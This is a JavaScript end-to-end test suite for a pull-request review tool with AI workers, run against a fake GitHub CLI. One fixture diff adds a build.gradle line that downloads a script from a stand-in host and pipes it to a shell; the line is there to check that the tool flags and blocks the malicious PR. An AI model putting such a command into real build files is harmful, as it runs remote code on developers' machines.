// End to end against a stateful fake `gh`: sync → scan → import findings → edit → stage as a pending review →
// comments added on GitHub come back → lint refusal → submit; and a malicious PR that must never run.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'prd-test-'));
const BIN = path.join(TMP, 'bin'); fs.mkdirSync(BIN);
fs.writeFileSync(path.join(BIN, 'gh'), `#!/bin/sh\nexec "${process.execPath}" "${path.join(HERE, 'fake-gh.mjs')}" "$@"\n`, { mode: 0o755 });
const STATE = path.join(TMP, 'gh.json');
const diff1 = 'diff --git a/a.txt b/a.txt\n--- a/a.txt\n+++ b/a.txt\n@@ -1,1 +1,3 @@\n one\n+two\n+three\n';
const diff2 = 'diff --git a/build.gradle b/build.gradle\n--- a/build.gradle\n+++ b/build.gradle\n@@ -1,1 +1,2 @@\n plugins {}\n+exec { commandLine "sh", "-c", "curl -s https://x.example/p | sh" }\n';
fs.writeFileSync(STATE, JSON.stringify({ prs: {
  1: { number: 1, title: '[fix][broker] Fix a thing', author: 'committer1', association: 'MEMBER', head: 'a'.repeat(40), updatedAt: '2026-11-19T00:00:00Z', diff: diff1 },
  3: { number: 3, title: '[fix][client] Another fix', author: 'committer1', association: 'MEMBER', head: 'c'.repeat(40), updatedAt: '2026-11-19T00:00:00Z', diff: diff1 },
  2: { number: 2, title: '[improve][build] Speed up the build', author: 'stranger', association: 'NONE', head: 'b'.repeat(40), updatedAt: '2026-11-19T00:00:00Z', diff: diff2 },
} }));
process.env.PATH = `${BIN}:${process.env.PATH}`;
process.env.FAKE_GH_STATE = STATE;
process.env.PRD_HOME = path.join(TMP, 'home');
const gh = () => JSON.parse(fs.readFileSync(STATE, 'utf8'));

const db = await import('../scripts/lib/db.mjs');
const { addRepo } = await import('../scripts/lib/repos.mjs');
const triage = await import('../scripts/lib/triage.mjs');
const review = await import('../scripts/lib/review.mjs');
const jobs = await import('../scripts/lib/jobs.mjs');
const autopilot = await import('../scripts/lib/autopilot.mjs');
const ci = await import('../scripts/lib/ci.mjs');
const cfgm = await import('../scripts/lib/config.mjs');
db.meta('budget', JSON.stringify({ available: false, at: new Date().toISOString() }));

test('sync scores committers up and red-flags the malicious PR', async () => {
  addRepo('o/r');
  const s = await triage.sync('o/r');
  assert.equal(s.prs, 3);
  await triage.scan('o/r', 1); await triage.scan('o/r', 2);
  const a = db.item('o/r', 1); const b = db.item('o/r', 2);
  assert.ok(a.flags.includes('committer'));
  assert.ok(a.score > b.score);
  assert.equal(a.gate, 'scanned'); assert.equal(a.lane, 'backlog');
  assert.equal(b.gate, 'flagged'); assert.equal(b.lane, 'security');
  assert.match(b.gate_note, /download piped to a shell/);
});

test('a flagged PR never gets a checkout, and the rules do not queue it', async () => {
  const id = jobs.enqueue('o/r', 2, 'review', {});
  assert.throws(() => jobs.worktree(id), /security gate is not "clear"/);
  const r = spawnSync(process.execPath, [path.join(HERE, '..', 'scripts', 'prd.mjs'), 'gate', String(id), 'clear', '--evidence', 'looks fine'], { encoding: 'utf8', env: process.env });
  assert.equal(r.status, 1); assert.match(r.stderr, /only the human can clear it/);
  assert.match(jobs.workerPrompt(jobs.job(id)), /security gate/);
  jobs.cancel(id);
  db.run(`UPDATE repos SET config = ? WHERE slug = 'o/r'`, JSON.stringify({ auto: { review: { minScore: -10000 } } }));
  const c = autopilot.ruleCandidates('o/r');
  assert.deepEqual(c.map((x) => x.number), [1]);
});

test('budget mode: no daily count, reviews continue until a usage window reaches maxPercent', () => {
  let tick = 0; // each reading newer than the last, as a refreshed one would be
  const reading = (claude, codex) => db.meta('budget', JSON.stringify({ available: true, at: new Date(Date.now() + 1000 * ++tick).toISOString(),
    claude: { available: true, tier: 'full', windows: [{ window: 'weekly 7d', percent: claude, pace: 0.5, counts: true, resets: '2026-11-21T00:00:00Z' }] },
    codex: { available: true, budget: 'rich', windows: [{ window: 'weekly', percent: codex, pace: 0.2, counts: true }] } }));
  // A full day of automatic reviews: the fixed cap is used up.
  for (let i = 0; i < 3; i++) { const id = jobs.enqueue('o/r', 3, 'review', { auto: 1 }); db.run(`UPDATE jobs SET status = 'done' WHERE id = ?`, id); }
  db.run(`UPDATE repos SET config = ? WHERE slug = 'o/r'`, JSON.stringify({ auto: { review: { minScore: -10000, maxPerDay: 3 } } }));
  let c = autopilot.ruleCandidates('o/r');
  assert.equal(c[0].slot, false); assert.match(c[0].wait, /daily limit reached: 3/);
  // Budget mode ignores the count while the windows have room.
  db.run(`UPDATE repos SET config = ? WHERE slug = 'o/r'`, JSON.stringify({ auto: { review: { minScore: -10000, maxPerDay: 'budget' }, budget: { maxPercent: 80 } } }));
  reading(40, 10);
  c = autopilot.ruleCandidates('o/r');
  assert.equal(c[0].slot, true);
  // A window at the threshold stops it, and says which one.
  reading(81, 10);
  c = autopilot.ruleCandidates('o/r');
  assert.equal(c[0].slot, false); assert.match(c[0].wait, /budget limit: Claude weekly 7d at 81%/);
  // maxPace stops a window that burns too fast even below maxPercent.
  db.run(`UPDATE repos SET config = ? WHERE slug = 'o/r'`, JSON.stringify({ auto: { review: { minScore: -10000, maxPerDay: 'budget' }, budget: { maxPercent: 95, maxPace: 0.4 } } }));
  reading(40, 10);
  assert.match(autopilot.ruleCandidates('o/r')[0].wait, /pace 0.5/);
  assert.throws(() => cfgm.apply({}, { auto: { review: { maxPerDay: 'lots' } } }), /number or "budget"/);
  db.run(`UPDATE jobs SET status = 'cancelled' WHERE repo = 'o/r' AND number = 3`);
  db.run(`UPDATE repos SET config = '{}' WHERE slug = 'o/r'`);
  db.meta('budget', JSON.stringify({ available: false, at: new Date(Date.now() + 1000 * ++tick).toISOString() }));
});

let rid;
test('findings import: anchors validated, names linked at the reviewed head', async () => {
  const r = await review.importFindings('o/r', 1, {
    schema: 1, repo: 'o/r', pr: 1, head: 'a'.repeat(12), summary: 'Thanks for the fix. See src/Other.java:10.',
    recommendedEvent: 'APPROVE', findings: [
      { id: 'i1', severity: 'BUG', claim: 'off by one', path: 'a.txt', line: 2, side: 'RIGHT', body: 'Evidence at a.txt:3.' },
      { id: 'i2', severity: 'QUALITY', claim: 'not in the diff', path: 'a.txt', line: 40, side: 'RIGHT', body: 'x' },
    ],
  });
  rid = r.review;
  const rv = db.review(rid);
  assert.equal(rv.head_sha, 'a'.repeat(40));
  assert.match(rv.body, /\[`src\/Other\.java:10`\]\(https:\/\/github\.com\/o\/r\/blob\/a{40}\/src\/Other\.java#L10\)/);
  const cs = db.comments(rid);
  assert.equal(cs[0].include, 1); assert.match(cs[0].body, /^\*\*\[BUG\] off by one\*\*/);
  assert.equal(cs[1].include, 0); assert.match(cs[1].anchor_error, /outside the diff hunks/);
  assert.equal(db.item('o/r', 1).lane, 'check');
});

test('stage → GitHub edits come back → lint refusal → submit with the human\'s event', async () => {
  await review.addComment(rid, { path: 'a.txt', line: 3, body: 'my own point' });
  await assert.rejects(review.addComment(rid, { path: 'a.txt', line: 99, body: 'x' }), /outside the diff hunks/);
  const s = await review.stage(rid);
  assert.equal(s.staged, 2); assert.equal(db.review(rid).status, 'staged');
  assert.equal(gh().review.commit, 'a'.repeat(40));
  assert.equal(db.item('o/r', 1).lane, 'staged');
  // On GitHub: the human edits the AI comment and adds one more.
  const g = gh(); g.review.comments[0].body = 'edited on GitHub';
  g.review.comments.push({ id: 9001, node_id: 'C9001', body: 'added on GitHub', path: 'a.txt', line: 2, side: 'RIGHT', html_url: 'u9001' }); fs.writeFileSync(STATE, JSON.stringify(g));
  const sy = await review.syncStaged(rid);
  assert.deepEqual([sy.added, sy.edited, sy.removed], [1, 1, 0]);
  const cs = db.comments(rid);
  assert.ok(cs.some((c) => c.source === 'github' && c.body === 'added on GitHub' && c.state === 'staged'));
  // Editing a staged comment here updates GitHub too.
  const mine = cs.find((c) => c.source === 'human');
  await review.updateComment(mine.id, { body: 'my own point, reworded' });
  assert.ok(gh().review.comments.some((c) => c.body === 'my own point, reworded'));
  // A disclosure in the body is refused until acknowledged.
  await assert.rejects(review.submit(rid, { event: 'REQUEST_CHANGES', body: 'This fixes CVE-2026-12345.' }), /refused: the text mentions/);
  assert.equal(gh().review.state, 'PENDING');
  review.ackLints(rid, ['security']);
  const r = await review.submit(rid, { event: 'REQUEST_CHANGES', body: 'Please fix the off-by-one.' });
  assert.equal(r.event, 'REQUEST_CHANGES');
  assert.equal(gh().review.state, 'CHANGES_REQUESTED');
  assert.equal(db.review(rid).status, 'submitted');
  assert.ok(db.comments(rid).filter((c) => c.include && !c.anchor_error).every((c) => c.state === 'posted'));
  await assert.rejects(review.submit(rid, { event: 'COMMENT' }), /already submitted/);
});

test('the CLI has no way to post', () => {
  const r = spawnSync(process.execPath, [path.join(HERE, '..', 'scripts', 'prd.mjs'), 'review', 'submit', String(rid)],
    { encoding: 'utf8', env: { ...process.env, PRD_JOB: '1' } });
  assert.equal(r.status, 1); assert.match(r.stderr, /human's action/);
  const calls = gh().calls.filter((c) => /events|issues\/1\/comments/.test(c));
  assert.equal(calls.length, 1);
});

test('a draft the PR has moved past cannot be submitted until it is revisited', async () => {
  const setPr = (fn) => { const g = gh(); fn(g.prs[3]); fs.writeFileSync(STATE, JSON.stringify(g)); };
  await triage.track('o/r', 3);
  const basis = new Date(Date.now() - 60_000).toISOString();
  const r1 = await review.importFindings('o/r', 3, { schema: 1, repo: 'o/r', pr: 3, head: 'c'.repeat(40), summary: 'Thanks.',
    findings: [{ id: 'i1', severity: 'BUG', claim: 'x', path: 'a.txt', line: 2, body: 'y' }] }, { basisAt: basis });
  assert.equal(db.item('o/r', 3).lane, 'check');
  // The author answers after the draft was written.
  setPr((p) => { p.comments = [{ author: 'committer1', at: new Date().toISOString(), body: 'fixed it differently' }]; p.updatedAt = new Date().toISOString(); });
  await assert.rejects(review.submit(r1.review, { event: 'COMMENT' }), (e) => e.code === 'STALE' && /author replied/.test(e.message));
  assert.equal(db.item('o/r', 3).lane, 'follow-up');
  assert.equal(gh().review.state, 'CHANGES_REQUESTED');   // still the earlier PR's review: nothing was posted here
  // ...and pushes new commits.
  setPr((p) => { p.head = 'd'.repeat(40); });
  await assert.rejects(review.submit(r1.review, { event: 'COMMENT' }), /new commits/);
  // Revisiting (a new round that read the new head and the reply) unblocks it; your own comment carries over.
  await triage.track('o/r', 3);
  const r2 = await review.importFindings('o/r', 3, { schema: 1, repo: 'o/r', pr: 3, head: 'd'.repeat(40), summary: 'Thanks, looks better.', findings: [] },
    { basisAt: new Date().toISOString() });
  assert.notEqual(r2.review, r1.review);
  assert.equal(db.review(r1.review).status, 'discarded');
  assert.equal(db.item('o/r', 3).lane, 'check');
  assert.deepEqual(triage.draftStaleness(db.review(r2.review), db.pr('o/r', 3)), []);
});

test('approving: held workflow runs, and "Update branch" when the PR has been quiet for a week', async () => {
  const old = new Date(Date.now() - 10 * 86400000).toISOString();
  const g = gh(); const p = g.prs[1];
  p.commitDate = old; p.behind = 4; p.fork = true; p.canModify = true;
  p.runs = [{ id: 700, name: 'CI', status: 'completed', conclusion: 'action_required', created_at: old, head_sha: p.head }];
  fs.writeFileSync(STATE, JSON.stringify(g));
  const s = await ci.status('o/r', 1);
  assert.equal(s.pending.length, 1); assert.equal(s.behindBy, 4); assert.equal(s.quiet, true);
  assert.deepEqual(s.defaults, { approveRuns: true, updateBranch: true });
  // Recent activity turns the branch update off by default; a fork without maintainer edits cannot be updated.
  const g2 = gh(); g2.prs[1].commitDate = new Date().toISOString(); fs.writeFileSync(STATE, JSON.stringify(g2));
  assert.equal((await ci.status('o/r', 1)).defaults.updateBranch, false);
  const g3 = gh(); g3.prs[1].commitDate = old; g3.prs[1].canModify = false; fs.writeFileSync(STATE, JSON.stringify(g3));
  assert.equal((await ci.status('o/r', 1)).canUpdate, false);
  const g4 = gh(); g4.prs[1].canModify = true; fs.writeFileSync(STATE, JSON.stringify(g4));
  // A flagged head refuses both.
  assert.equal((await ci.status('o/r', 2)).gateBlocks, true);

  const ap = await ci.approveRuns('o/r', 'a'.repeat(40));
  assert.deepEqual(ap.approved, ['CI']); assert.deepEqual(gh().approved, [700]);
  // Update branch: the merge commit is mine, so the approved PR does not drop into "Changed since your review".
  await ci.updateBranch('o/r', 1, 'a'.repeat(40));
  await ci.followUp('o/r', 1, 'a'.repeat(40), { sleep: async () => {}, polls: 5 });
  assert.equal(gh().prs[1].head, 'e'.repeat(40));
  assert.deepEqual(gh().approved, [700, 801]);
  assert.ok(ci.updatedByMe('o/r', 1, 'a'.repeat(40), 'e'.repeat(40)));
  assert.ok(!ci.updatedByMe('o/r', 1, 'a'.repeat(40), 'f'.repeat(40)));
  await assert.rejects(ci.updateBranch('o/r', 1, 'a'.repeat(40)), /expected_head_sha/);
});

const threads = await import('../scripts/lib/threads.mjs');
const merge = await import('../scripts/lib/merge.mjs');
const server = await import('../scripts/lib/server.mjs');
const setGh = (fn) => { const g = gh(); fn(g); fs.writeFileSync(STATE, JSON.stringify(g)); };

test('approved PR with open threads: plan → resolve, follow-up issue, nudge; a thread that moved on is refused', async () => {
  setGh((g) => {
    g.prs[5] = { number: 5, title: '[fix][broker] Approved but blocked', author: 'author5', association: 'CONTRIBUTOR', head: '5'.repeat(40), updatedAt: '2026-11-20T00:00:00Z',
      diff: diff1, reviewDecision: 'APPROVED', threads: [
        { id: 'T1', path: 'a.txt', isOutdated: true, comments: [{ id: 11, author: 'me', body: 'rename this' }, { id: 12, author: 'author5', body: 'done' }] },
        { id: 'T2', path: 'a.txt', comments: [{ id: 21, author: 'other', body: 'Consider caching the lookup' }], url: 'T2-url' },
        { id: 'T3', path: 'a.txt', comments: [{ id: 31, author: 'me', body: 'missing null check' }] },
      ] };
  });
  await triage.track('o/r', 5);
  assert.deepEqual(threads.mergeBlock(db.pr('o/r', 5)), { open: 3, outdated: 1 });
  const id = jobs.enqueue('o/r', 5, 'threads', {});
  const ctx = await jobs.context(id);
  assert.equal(ctx.openThreads.length, 3); assert.match(ctx.threadPlanOut, /threads\.json$/);
  assert.match(jobs.workerPrompt(jobs.job(id)), /threads import/);
  assert.throws(() => threads.importPlan(jobs.job(id), { threads: [{ threadId: 'NOPE', action: 'resolve' }] }), /not open threads/);
  assert.throws(() => threads.importPlan(jobs.job(id), { threads: [{ threadId: 'T2', action: 'issue' }] }), /needs issue.title/);
  threads.importPlan(jobs.job(id), { head: '5'.repeat(40), threads: [
    { threadId: 'T1', verdict: 'ADDRESSED', action: 'resolve', evidence: 'renamed in 5555555' },
    { threadId: 'T2', verdict: 'FOLLOW_UP', action: 'issue', reply: 'Good idea; tracked in {issue}.', issue: { title: '[improve][broker] Cache the lookup', body: 'The lookup runs per message.' } },
    { threadId: 'T3', verdict: 'NOT_ADDRESSED', action: 'nag', reply: 'Could you add the null check before merging?' },
  ] });
  jobs.finish(id, 'done', { summary: 'plan written' });
  const acts = threads.actions('o/r', 5);
  assert.deepEqual(acts.map((a) => [a.thread_id, a.include]), [['T1', true], ['T2', false], ['T3', true]]);   // the other reviewer's thread starts unticked
  // Lints apply as for a review.
  threads.updateAction(acts[2].id, { reply: 'This fixes CVE-2026-1234.' });
  await assert.rejects(threads.apply('o/r', 5), (e) => e.code === 'LINT');
  threads.updateAction(acts[2].id, { reply: 'Could you add the null check before merging?' });
  threads.updateAction(acts[1].id, { include: true });
  // The author answers in T3 after the assessment: that one is refused, the others apply.
  setGh((g) => { g.prs[5].threads[2].comments.push({ id: 32, author: 'author5', body: 'will do' }); g.prs[5].updatedAt = new Date().toISOString(); });
  const r = await threads.apply('o/r', 5);
  const by = Object.fromEntries(r.results.map((x) => [x.action, x]));
  assert.equal(by.resolve.status, 'applied'); assert.equal(by.issue.status, 'applied'); assert.equal(by.issue.issue, 901);
  assert.equal(by.nag.status, 'failed'); assert.match(by.nag.error, /new comment/);
  const g = gh();
  assert.deepEqual(g.resolved.filter((x) => /^T/.test(x)), ['T1', 'T2']);
  assert.equal(g.issues[0].title, '[improve][broker] Cache the lookup'); assert.match(g.issues[0].body, /Follow-up from T2-21 in #5\./);
  assert.deepEqual(g.replies.map((x) => [x.to, x.body]), [[21, 'Good idea; tracked in #901.']]);
  assert.deepEqual(threads.mergeBlock(db.pr('o/r', 5)), { open: 1, outdated: 0 });
  // By hand: follow-up issue and resolve on the remaining thread, with the default reply.
  const manual = threads.addAction('o/r', 5, { threadId: 'T3', action: 'issue', issue: { title: 'Null check', body: '' } });
  const r2 = await threads.apply('o/r', 5, { ids: [manual] });
  assert.equal(r2.results[0].status, 'applied');
  assert.match(gh().replies.at(-1).body, /tracked as a follow-up in #902/);
  assert.equal(threads.mergeBlock(db.pr('o/r', 5)), null);
});

test('batch CI approval: pending runs on scanned heads only', async () => {
  setGh((g) => {
    g.prs[7] = { number: 7, title: '[fix][client] Needs CI', author: 'stranger', association: 'NONE', head: '7'.repeat(40), updatedAt: '2026-11-20T00:00:00Z', diff: diff1,
      runs: [{ id: 970, name: 'CI', status: 'completed', conclusion: 'action_required', created_at: '2026-11-20T00:00:00Z', head_sha: '7'.repeat(40) }] };
    g.prs[2].runs = [{ id: 920, name: 'CI', status: 'completed', conclusion: 'action_required', created_at: '2026-11-20T00:00:00Z', head_sha: 'b'.repeat(40) }];
  });
  await triage.track('o/r', 7);
  const rows = await server.ciCheck('o/r', [7, 2]);
  assert.deepEqual(rows.map((r) => [r.number, r.pending, r.blocked]), [[7, ['CI'], null], [2, ['CI'], 'security gate "flagged"']]);
  assert.equal(db.item('o/r', 7).scan_sha, '7'.repeat(40));   // scanned on the way
  const before = (gh().approved || []).length;
  for (const r of rows.filter((x) => !x.blocked)) await ci.approveRuns('o/r', r.head);
  assert.deepEqual(gh().approved.slice(before), [970]);
});

test('merge conflicts: merge the base branch, the worker resolves, the engine checks, the human pushes', async () => {
  const sh = (cwd, ...a) => { const r = spawnSync('git', ['-C', cwd, ...a], { encoding: 'utf8' }); if (r.status !== 0) throw new Error(`git ${a.join(' ')}: ${r.stderr}`); return r.stdout.trim(); };
  const up = path.join(TMP, 'up.git'); const co = path.join(TMP, 'co');
  spawnSync('git', ['init', '--bare', '-q', up]); spawnSync('git', ['init', '-q', co]);
  sh(co, 'config', 'user.email', 't@example.com'); sh(co, 'config', 'user.name', 'T'); sh(co, 'remote', 'add', 'origin', up);
  sh(co, 'checkout', '-q', '-b', 'main');
  fs.writeFileSync(path.join(co, 'a.txt'), 'one\n'); sh(co, 'add', '.'); sh(co, 'commit', '-qm', 'base'); sh(co, 'push', '-q', 'origin', 'main');
  sh(co, 'checkout', '-q', '-b', 'pr'); fs.writeFileSync(path.join(co, 'a.txt'), 'one from the PR\n'); sh(co, 'commit', '-qam', 'pr change');
  const head = sh(co, 'rev-parse', 'HEAD'); sh(co, 'push', '-q', 'origin', `pr:refs/pull/6/head`, 'pr:refs/heads/feature');
  sh(co, 'checkout', '-q', 'main'); fs.writeFileSync(path.join(co, 'a.txt'), 'one from main\n'); sh(co, 'commit', '-qam', 'main change'); sh(co, 'push', '-q', 'origin', 'main');
  const base = sh(co, 'rev-parse', 'HEAD');
  db.run(`UPDATE repos SET checkout = ?, remote = 'origin' WHERE slug = 'o/r'`, co);
  setGh((g) => { g.prs[6] = { number: 6, title: '[fix][broker] Conflicting', author: 'committer1', association: 'MEMBER', head, updatedAt: '2026-11-20T00:00:00Z', diff: diff1, mergeable: 'CONFLICTING' }; });
  await triage.track('o/r', 6); await triage.scan('o/r', 6);
  assert.equal(db.pr('o/r', 6).analysis.mergeable, 'CONFLICTING');
  const id = jobs.enqueue('o/r', 6, 'merge', {});
  await assert.rejects(merge.start(id), /security gate is not "clear"/);
  db.run(`UPDATE items SET gate = 'clear', gate_sha = ? WHERE repo = 'o/r' AND number = 6`, head);
  const s = await merge.start(id);
  assert.deepEqual(s.conflicts, ['a.txt']); assert.equal(s.base, base);
  const wt = jobs.job(id).worktree;
  assert.throws(() => merge.ready(id), /still in progress/);
  fs.writeFileSync(path.join(wt, 'a.txt'), 'one from the PR and main\n'); sh(wt, 'add', 'a.txt'); sh(wt, 'commit', '-q', '--no-edit');
  const m = merge.ready(id);
  assert.equal(sh(wt, 'rev-list', '--parents', '-n', '1', 'HEAD').split(' ').length, 3);
  jobs.finish(id, 'done', { summary: 'kept both lines' });
  assert.equal(jobs.job(id).result.merge.mergeSha, m.mergeSha);   // the worker's report does not drop the checked commit
  // The base moved while the merge waited: the push fetches it again and refuses until a re-merge (or an ack).
  fs.writeFileSync(path.join(co, 'b.txt'), 'new on main\n'); sh(co, 'add', 'b.txt'); sh(co, 'commit', '-qm', 'more on main'); sh(co, 'push', '-q', 'origin', 'main');
  const base2 = sh(co, 'rev-parse', 'HEAD');
  await assert.rejects(merge.push(id, { urlFor: () => up }), (e) => e.code === 'BASE_MOVED' && /1 new commit/.test(e.message));
  // Re-merge with the latest base: a.txt was not changed by main again, so its earlier resolution is reused.
  const id2 = jobs.enqueue('o/r', 6, 'merge', { prev: { job: id, mergeSha: m.mergeSha, base: m.base, head } });
  const s2 = await merge.start(id2);
  assert.equal(s2.base, base2); assert.deepEqual(s2.reused, ['a.txt']); assert.deepEqual(s2.conflicts, []); assert.equal(s2.committed, true);
  const m2 = merge.ready(id2);
  assert.equal(fs.readFileSync(path.join(jobs.job(id2).worktree, 'a.txt'), 'utf8'), 'one from the PR and main\n');
  jobs.finish(id2, 'done', { summary: 'reused' });
  // A retargeted PR: the merge of the old base is refused.
  setGh((g) => { g.prs[6].base = 'branch-x'; });
  await assert.rejects(merge.push(id2, { urlFor: () => up }), (e) => e.code === 'BASE_CHANGED');
  setGh((g) => { g.prs[6].base = 'main'; });
  const r = await merge.push(id2, { urlFor: () => up });
  assert.equal(r.pushed, m2.mergeSha);
  assert.equal(spawnSync('git', ['--git-dir', up, 'rev-parse', 'refs/heads/feature'], { encoding: 'utf8' }).stdout.trim(), m2.mergeSha);
  await assert.rejects(merge.push(id2, { urlFor: () => up }), /already pushed/);
});

test('a change to the PR: several threads and instructions in one batch, checked, reviewed, pushed, threads replied and resolved', async () => {
  const change = await import('../scripts/lib/change.mjs');
  const sh = (cwd, ...a) => { const r = spawnSync('git', ['-C', cwd, ...a], { encoding: 'utf8' }); if (r.status !== 0) throw new Error(`git ${a.join(' ')}: ${r.stderr}`); return r.stdout.trim(); };
  const up = path.join(TMP, 'up8.git'); const co = path.join(TMP, 'co8');
  spawnSync('git', ['init', '--bare', '-q', up]); spawnSync('git', ['init', '-q', co]);
  sh(co, 'config', 'user.email', 't@example.com'); sh(co, 'config', 'user.name', 'T'); sh(co, 'remote', 'add', 'origin', up);
  sh(co, 'checkout', '-q', '-b', 'main');
  fs.writeFileSync(path.join(co, 'a.txt'), 'one\n'); sh(co, 'add', '.'); sh(co, 'commit', '-qm', 'base'); sh(co, 'push', '-q', 'origin', 'main');
  sh(co, 'checkout', '-q', '-b', 'pr'); fs.writeFileSync(path.join(co, 'a.txt'), 'one\ntwo\n'); sh(co, 'commit', '-qam', 'pr change');
  const head = sh(co, 'rev-parse', 'HEAD'); sh(co, 'push', '-q', 'origin', 'pr:refs/pull/8/head', 'pr:refs/heads/feature');
  sh(co, 'checkout', '-q', 'main');
  db.run(`UPDATE repos SET checkout = ?, remote = 'origin' WHERE slug = 'o/r'`, co);
  setGh((g) => { g.prs[8] = { number: 8, title: '[fix][broker] Someone else\'s PR', author: 'author8', association: 'CONTRIBUTOR', head, updatedAt: '2026-11-20T00:00:00Z', diff: diff1, fork: true, canModify: false,
    threads: [{ id: 'T8a', path: 'a.txt', comments: [{ id: 81, author: 'me', body: 'rename two to 2' }] }, { id: 'T8b', path: 'a.txt', comments: [{ id: 82, author: 'other', body: 'add three' }] }] }; });
  await triage.track('o/r', 8); await triage.scan('o/r', 8);
  await assert.rejects(change.pushable('o/r', 8), /not allowed edits from maintainers/);
  setGh((g) => { g.prs[8].canModify = true; });
  await change.pushable('o/r', 8);
  const id = jobs.enqueue('o/r', 8, 'change', { threadIds: ['T8a', 'T8b'], instructions: 'Also add a trailing line "end"' });
  assert.match(jobs.workerPrompt(jobs.job(id)), /change-ready/);
  assert.deepEqual((await jobs.context(id)).changeThreads.map((t) => t.id), ['T8a', 'T8b']);
  assert.throws(() => change.start(id), /security gate is not "clear"/);
  db.run(`UPDATE items SET gate = 'clear', gate_sha = ? WHERE repo = 'o/r' AND number = 8`, head);
  const wt = change.start(id).worktree;
  assert.throws(() => change.ready(id), /no commits on top/);
  fs.writeFileSync(path.join(wt, 'a.txt'), 'one\n2\n'); sh(wt, 'commit', '-qam', 'Rename two to 2');
  fs.writeFileSync(path.join(wt, 'a.txt'), 'one\n2\nthree\n'); sh(wt, 'commit', '-qam', 'Add three');
  fs.writeFileSync(path.join(wt, 'a.txt'), 'one\n2\nthree\nend\n');
  assert.throws(() => change.ready(id), /uncommitted changes/);
  sh(wt, 'commit', '-qam', 'Add the end line');
  const c = change.ready(id, { replies: [{ threadId: 'T8a', reply: 'Renamed in {commits}.', resolve: true }] });
  assert.deepEqual(c.commits.map((x) => x.subject), ['Rename two to 2', 'Add three', 'Add the end line']);
  assert.deepEqual(c.replies.map((r) => [r.threadId, r.reply, r.resolve]), [['T8a', 'Renamed in {commits}.', true], ['T8b', 'Addressed in {commits}.', true]]);
  assert.match(c.diff, /\+end/);
  jobs.finish(id, 'done', { summary: 'three commits' });
  assert.ok(fs.existsSync(wt), 'the worktree stays for the human to review or edit');
  assert.equal(jobs.job(id).result.change.sha, c.sha);
  // Edited after the check: the push refuses until it is checked again.
  fs.writeFileSync(path.join(wt, 'b.txt'), 'x\n'); sh(wt, 'add', 'b.txt'); sh(wt, 'commit', '-qm', 'unchecked');
  await assert.rejects(change.push(id, { urlFor: () => up }), /not checked/);
  sh(wt, 'reset', '-q', '--hard', c.sha);
  await assert.rejects(change.push(id, { urlFor: () => up, replies: [{ ...c.replies[0], reply: 'Fixes CVE-2026-1234 in {commits}.' }] }), (e) => e.code === 'LINT');
  const r = await change.push(id, { urlFor: () => up, replies: [c.replies[0], { ...c.replies[1], resolve: false, reply: 'Added in {commits}; leaving it open for you to check.' }] });
  assert.equal(r.pushed, c.sha);
  assert.equal(spawnSync('git', ['--git-dir', up, 'rev-parse', 'refs/heads/feature'], { encoding: 'utf8' }).stdout.trim(), c.sha);
  const g = gh();
  const mine = g.replies.filter((x) => [81, 82].includes(x.to));
  assert.equal(mine.length, 2);
  assert.match(mine[0].body, new RegExp(`^Renamed in https://github.com/o/r/commit/${c.commits[0].sha}, .*${c.commits[2].sha}\\.$`));
  assert.ok(g.resolved.includes('T8a') && !g.resolved.includes('T8b'));
  assert.ok(!fs.existsSync(wt), 'the worktree is removed after the push');
  await assert.rejects(change.push(id, { urlFor: () => up }), /already pushed/);
  assert.ok(ci.updatedByMe('o/r', 8, head, c.sha), 'my commits are not new work by the author');
});
